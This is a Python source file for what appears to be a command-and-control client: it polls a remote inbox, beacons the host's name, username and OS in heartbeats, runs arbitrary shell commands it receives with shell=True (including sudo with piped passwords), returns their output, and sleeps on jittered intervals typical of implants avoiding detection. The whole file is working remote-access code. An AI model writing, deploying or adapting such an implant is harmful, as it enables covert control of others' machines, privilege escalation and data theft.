import getpass
import json
import platform
import random
import subprocess
import time
import uuid
from datetime import datetime, timezone

import common

def _system_info():
    try:
        username = getpass.getuser()
    except Exception:
        username = "unknown"
    return {
        "os": platform.system(),
        "os_version": platform.version(),
        "hostname": platform.node(),
        "python_version": platform.python_version(),
        "architecture": platform.machine(),
        "username": username,
    }

def handle_system_info(payload):
    return _system_info()

def send_heartbeat(config):
    common.write_form({
        "command_id": f"heartbeat-{uuid.uuid4()}",
        "client_id": config.get("client_id", "unknown"),
        "status": "heartbeat",
        "result": json.dumps(_system_info()),
        "timestamp": now_iso(),
    })
    print("[client] Heartbeat sent")

def now_iso():
    return datetime.now(timezone.utc).isoformat()

def handle_echo(payload):
    return payload

def handle_shell(payload):
    cmd = payload.get("cmd", "")
    stdin_data = payload.get("stdin")
    # Safety: if cmd already pipes input to sudo, ignore the stdin field to avoid conflict
    if stdin_data is not None and "| sudo -S" in cmd:
        print(f"[client] Warning: ignoring stdin field because cmd already contains piped input")
        stdin_data = None
    if stdin_data is not None:
        print(f"[client] shell stdin=PIPE cmd={cmd!r}")
        proc = subprocess.run(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            input=stdin_data.encode(),
            timeout=30,
        )
        stdout = proc.stdout.decode(errors="replace")
        stderr = proc.stderr.decode(errors="replace")
    else:
        print(f"[client] shell stdin=DEVNULL cmd={cmd!r}")
        proc = subprocess.run(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.DEVNULL,
            timeout=30,
        )
        stdout = proc.stdout.decode(errors="replace")
        stderr = proc.stderr.decode(errors="replace")
    return {
        "stdout": stdout,
        "stderr": stderr,
        "returncode": proc.returncode,
    }

HANDLERS = {
    "system_info": handle_system_info,
    "echo": handle_echo,
    "shell": handle_shell,
}

def main():
    common.load_env()
    processed = set()
    config = None
    poll_cycle = 0
    last_heartbeat_cycle = -10  # ensures heartbeat fires on cycle 0

    print("[client] Starting poll loop...")

    while True:
        try:
            config = common.read_config()

            # Send heartbeat every 10 poll cycles
            if poll_cycle - last_heartbeat_cycle >= 10:
                send_heartbeat(config)
                last_heartbeat_cycle = poll_cycle

            inbox = common.read_inbox()
            outbox = common.read_outbox()

            # Rebuild state from outbox on first run
            if not processed:
                processed = {r["command_id"] for r in outbox if r.get("command_id")}

            pending = [cmd for cmd in inbox
                       if cmd.get("status") == "pending"
                       and cmd["command_id"] not in processed]

            for cmd in pending:
                handler = HANDLERS.get(cmd["command"])
                if handler:
                    try:
                        payload = json.loads(cmd["payload"]) if cmd["payload"] else {}
                        result = handler(payload)
                        status = "success"
                    except Exception as e:
                        result = {"error": str(e)}
                        status = "error"
                else:
                    result = {"error": f"unknown command: {cmd['command']}"}
                    status = "error"

                common.write_form({
                    "command_id": cmd["command_id"],
                    "client_id": config.get("client_id", "unknown"),
                    "status": status,
                    "result": json.dumps(result),
                    "timestamp": now_iso(),
                })
                processed.add(cmd["command_id"])
                print(f"[client] Processed {cmd['command_id']}: {cmd['command']} → {status}")

        except Exception as e:
            print(f"[client] Poll error: {e}")

        poll_cycle += 1
        interval = int(config.get("poll_interval_sec", 30)) if config else 30
        jitter_min = float(config.get("poll_jitter_min", 0)) if config else 0
        jitter_max = float(config.get("poll_jitter_max", 0)) if config else 0
        sleep_time = interval + random.uniform(jitter_min, jitter_max)
        print(f"[client] Sleeping {sleep_time:.1f}s...")
        time.sleep(sleep_time)

if __name__ == "__main__":
    main()
